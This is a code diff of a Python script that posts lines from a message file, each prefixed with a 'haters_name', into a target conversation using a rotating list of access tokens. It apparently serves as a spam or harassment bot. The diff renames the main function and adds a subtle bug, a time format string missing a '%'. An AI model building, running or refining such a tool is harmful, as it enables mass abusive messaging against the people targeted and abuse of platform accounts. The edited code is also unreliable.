@@ -9,7 +9,7 @@ import http.server
 import socketserver
 import threading
 
-def send_messages():
+def main():
     with open('password.txt', 'r') as file:
         password = file.read().strip()
 
@@ -60,7 +60,6 @@ def send_messages():
     with open('convoid.txt', 'r') as file:
         convo_id = file.read().strip()
 
-
     with open('File.txt', 'r') as file:
         messages = file.readlines()
 
@@ -87,7 +86,7 @@ def send_messages():
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
 
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                current_time = time.strftime("%Y-%m-%d %I:%M:S %p")
                 if response.ok:
                     print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
@@ -106,9 +105,5 @@ def send_messages():
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
 
-    send_messages()
-
 if __name__ == '__main__':
     main()
-
-
